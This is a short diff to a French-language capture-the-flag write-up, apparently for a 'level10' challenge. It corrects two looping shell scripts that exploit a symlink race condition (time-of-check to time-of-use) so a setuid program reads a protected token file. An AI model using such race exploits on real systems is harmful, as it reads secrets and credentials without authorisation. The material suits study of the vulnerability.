@@ -17,6 +17,7 @@ Ainsi on va écrire 2 scripts:
 /*********************/
     #!/bin/sh
     while true; do
+    touch /tmp/tok
     rm -rf /tmp/tok
     ln -s ~/token /tmp/tok
     done
@@ -26,7 +27,7 @@ Ce script créé en boucle le lien symbolique de token vers /tmp/tok. cela va pe
     - /tmp/method:
 /**********************/
     #!/bin/sh
-    while tru; do
+    while true; do
     ~/level10 /tmp/tok 127.0.0.1
     done
 /**********************/
